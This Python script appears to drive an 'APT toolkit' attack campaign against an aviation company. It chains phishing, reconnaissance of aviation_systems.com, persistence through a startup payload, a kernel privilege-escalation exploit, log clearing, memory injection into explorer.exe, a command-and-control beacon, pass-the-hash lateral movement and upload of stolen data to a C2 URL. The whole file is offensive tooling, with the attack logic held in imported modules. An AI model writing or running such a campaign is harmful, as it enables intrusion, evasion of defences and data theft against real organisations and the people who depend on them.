import os
import sys
import subprocess
import json

# Add apt_toolkit to the Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

from apt_toolkit import initial_access
from apt_toolkit import persistence
from apt_toolkit import privilege_escalation
from apt_toolkit import defense_evasion
from apt_toolkit import command_control
from apt_toolkit import exfiltration
from apt_toolkit import lateral_movement

def run_tool(tool_name, args=""):
    """Runs a tool from the campaign's tools directory."""
    tool_path = os.path.join(os.path.dirname(__file__), "tools", tool_name)
    if not os.path.exists(tool_path):
        # If tool is not in campaign's tool directory, try root tools directory
        tool_path = os.path.join(os.path.dirname(__file__), "..", "..", "tools", tool_name)

    if not os.path.exists(tool_path):
        print(f"[-] Tool {tool_name} not found.")
        return

    print(f"[*] Running tool: {tool_name}...")
    try:
        subprocess.run(f"{tool_path} {args}", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running tool {tool_name}: {e}")
    except FileNotFoundError:
        print(f"[-] Tool {tool_name} not found at {tool_path}")


def main():
    """
    Main function to run the aviation_system_campaign campaign.
    """
    print(f"[*] Starting aviation_system_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("aviation_systems_employees.txt")
    run_tool("apt_web_recon.js", "--target aviation_systems.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/data_exfiltrator.py")


    # 3. Privilege Escalation
    print("\n[*] Phase 3: Privilege Escalation")
    privilege_escalation.exploit_kernel_vulnerability()


    # 4. Defense Evasion
    print("\n[*] Phase 4: Defense Evasion")
    defense_evasion.clear_logs()
    run_tool("apt_memory_injector.c", "--process explorer.exe --payload payloads/beacon.dll")


    # 5. Command and Control
    print("\n[*] Phase 5: Command and Control")
    c2_server = command_control.start_c2_server()
    command_control.send_beacon(c2_server, "VICTIM-AVIATION_SYSTEMS-01")


    # 6. Lateral Movement
    print("\n[*] Phase 6: Lateral Movement")
    lateral_movement.pass_the_hash("admin", "hash123")


    # 7. Exfiltration
    print("\n[*] Phase 7: Exfiltration")
    exfiltration.exfiltrate_data("data/data.zip", "https://c2.example.com/upload")
    run_tool("payloads/data_exfiltrator.py")


    print("\n[*] Campaign finished.")


if __name__ == "__main__":
    main()